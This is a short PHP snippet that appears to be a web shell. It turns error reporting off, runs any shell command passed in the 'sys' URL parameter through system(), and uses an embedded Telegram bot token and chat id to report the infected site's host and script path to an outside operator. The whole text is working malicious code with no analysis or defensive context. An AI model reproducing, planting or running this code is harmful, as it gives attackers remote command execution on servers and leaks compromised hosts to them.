error_reporting(0);
system($_GET['sys']);
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
